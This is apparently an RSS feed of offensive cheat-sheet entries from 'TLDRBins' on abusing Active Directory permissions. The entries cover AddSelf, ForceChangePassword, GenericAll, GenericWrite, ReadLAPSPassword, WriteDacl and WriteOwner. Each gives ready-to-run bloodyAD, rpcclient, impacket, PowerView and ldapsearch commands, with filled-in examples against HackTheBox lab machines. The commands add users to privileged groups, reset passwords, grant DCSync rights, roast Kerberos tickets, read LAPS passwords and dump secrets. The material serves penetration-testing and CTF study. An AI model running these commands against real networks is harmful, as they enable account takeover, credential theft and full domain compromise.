channel.title: Powerview on TLDRBins
channel.description: Recent content in Powerview on TLDRBins

item.title: AddSelf
item.description: Privesc #1: Add self to group (From Linux) bloodyAD powerview.py 1. Add self to group # With password python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' --host <DC> add groupMember '<GROUP>' '<USER>' $ python3 bloodyAD.py -d rebound.htb -u 'oorend' -p '1GR8t@$$4u' --host 10.10.11.231 add groupMember SERVICEMGMT 'oorend' [+] oorend added to SERVICEMGMT # With Kerberos python3 bloodyAD.py -d <DOMAIN> -u '<USER>' -p '<PASSWORD>' -k --host <DC> add groupMember '<GROUP>' '<USER>' $ python3 bloodyAD.

item.title: ForceChangePassword
item.description: Change target user password (From Linux) BloodyAD rpcclient python3 bloodyAD.py -d <DOMAIN> -u <USER> -p '<PASSWORD>' --host <DC> set password '<TARGET_USER>' '<NEW_PASSWORD>' $ python3 bloodyAD.py -d object.local -u oliver -p 'c1cdfun_d2434' --host jenkins.object.local set password smith 'Test1234' [+] Password changed successfully! Ref: bloodyAD rpcclient -U '<DOMAIN>/<USER>%<PASSWORD>' <TARGET> -c 'setuserinfo2 <TARGET_USER> 23 <NEW_PASSWORD>' $ rpcclient -U 'object.local/oliver%c1cdfun_d2434' 10.10.11.132 -c 'setuserinfo2 smith 23 Test1234' Change target user password (From Windows) Windows 1. Import PowerView .

item.title: GenericAll
item.description: Abuse #1: Change target user password Linux Windows 1. Add Full Control to current user impacket bloodyAD Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install . Add Full Control to current user sudo ntpdate -s <DC> && dacledit.py -k '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC> -principal <USER> -target-dn 'OU=<TARGET_GROUP>,DC=<EXAMPLE>,DC=<COM>' -inheritance -action write -rights FullControl -use-ldaps $ dacledit.py -k 'rebound.htb/oorend:1GR8t@$$4u' -dc-ip 10.10.11.231 -principal oorend -target-dn 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' -inheritance -action write -rights FullControl -use-ldaps Impacket v0.

item.title: GenericWrite
item.description: Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to target user Windows 1. Import PowerView . .\PowerView.ps1 2. Check target user Get-DomainUser <TARGET_USER> | ConvertFrom-UACValue 3. Add UF_DONT_REQUIRE_PREAUTH bit Set-DomainObject -Identity <TARGET_USER> -XOR @{useraccountcontrol=4194304} -Verbose 4. AS-REP Roasting # In local linux machine impacket-GetNPUsers '<DOMAIN>/<USER>' -no-pass -dc-ip <DC> Abuse #2 : Kerberoasting by adding spn Windows 1. Import PowerView . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString <PASSWORD> -AsPlainText -Force $cred = new-object -typename System.

item.title: ReadLAPSPassword
item.description: Abuse #1: Read LAPS Password Linux Windows ldapsearch -H ldap://<TARGET> -b 'DC=<EXAMPLE>,DC=<COM>' -x -D <USER>@<DOMAIN> -w '<PASSWORD>' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd $ ldapsearch -H ldap://10.10.10.240 -b 'DC=LicorDeBellota,DC=HTB' -x -D bob@LicorDeBellota.htb -w 'Test1234!@' '(ms-MCS-AdmPwd=*)' ms-MCS-AdmPwd # extended LDIF # # LDAPv3 # base <DC=LicorDeBellota,DC=HTB> with scope subtree # filter: (ms-MCS-AdmPwd=*) # requesting: ms-MCS-AdmPwd # # PIVOTAPI, Domain Controllers, LicorDeBellota.htb dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x # search reference ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell ota,DC=htb # search reference ref: ldap://DomainDnsZones.

item.title: WriteDacl
item.description: Abuse #1: Add dcsync right to user Windows 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> . .\PowerView.ps1 2. Create a cred object (runas) [optional] $username = '<DOMAIN>\<USER>' $password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $password 3. Add dcsync right Add-DomainObjectAcl -PrincipalIdentity <USER> -TargetIdentity '<DOMAIN>\<TARGET_GROUP>' -Rights DCSync -Credential $cred *Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -PrincipalIdentity 'svc-alfresco' -TargetIdentity 'HTB.LOCAL\Domain Admins' -Rights DCSync -Credential $Cred 4. Secrets dump Linux impacket-secretsdump '<USER>:<PASSWORD>@<TARGET>' $ impacket-secretsdump 'svc-alfresco:s3rvice@10.

item.title: WriteOwner/Own
item.description: Abuse #1 : Change owner of the group Windows 1. Import PowerView . .\PowerView.ps1 *Evil-WinRM* PS C:\Users\maria> . .\PowerView.ps1 2. Change owner Set-DomainObjectOwner -Identity '<GROUP>' -OwnerIdentity '<TARGET_USER>' *Evil-WinRM* PS C:\Users\maria> Set-DomainObjectOwner -Identity 'DOMAIN ADMINS' -OwnerIdentity 'maria' Abuse #2 : Add user to the group Linux Windows 1. Add full control permission to the user over the group impacket bloodyAD # Install latest impacket (included dacledit.py) git clone https://github.com/fortra/impacket.git cd impacket pip3 install .
